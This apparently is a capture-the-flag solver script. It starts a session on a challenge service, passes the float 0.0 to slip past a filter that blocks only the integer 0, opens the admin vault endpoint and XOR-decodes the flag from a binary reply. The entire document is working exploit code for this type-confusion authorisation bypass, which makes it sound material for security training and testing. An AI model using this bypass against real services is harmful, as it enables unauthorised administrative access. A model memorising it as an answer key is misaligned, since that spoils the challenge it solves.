#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import json, struct, sys, zlib
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# Step 1: init session
req = Request(base + "/api/init", data=b"{}", method="POST")
resp = urlopen(req, timeout=5)
sid = json.loads(resp.read())["session"]

# Step 2: configure counter with float 0.0
# Filter: counter is 0 → True for int 0 (blocked), False for float 0.0 (allowed)
# Resolver: counter == 0 → True for both int 0 and float 0.0
body = json.dumps({"counter": 0.0}).encode()
req = Request(base + "/api/configure", data=body,
              headers={"Content-Type": "application/json", "X-Session": sid}, method="POST")
resp = urlopen(req, timeout=5)
assert json.loads(resp.read())["status"] == "configured"

# Step 3: access admin vault
req = Request(base + "/api/admin", headers={"X-Session": sid})
resp = urlopen(req, timeout=5)
data = resp.read()

# Step 4: parse binary struct (XOR-encoded flag)
magic = data[:4]
if magic != b"\x7fSES":
    raise SystemExit(f"bad magic: {magic!r}")
crc_stored = struct.unpack(">H", data[4:6])[0]
key = crc_stored & 0xFF
flag_len = struct.unpack(">H", data[6:8])[0]
encoded = data[8:8 + flag_len]
flag = bytes(b ^ key for b in encoded).decode("utf-8")
print(flag)
PY
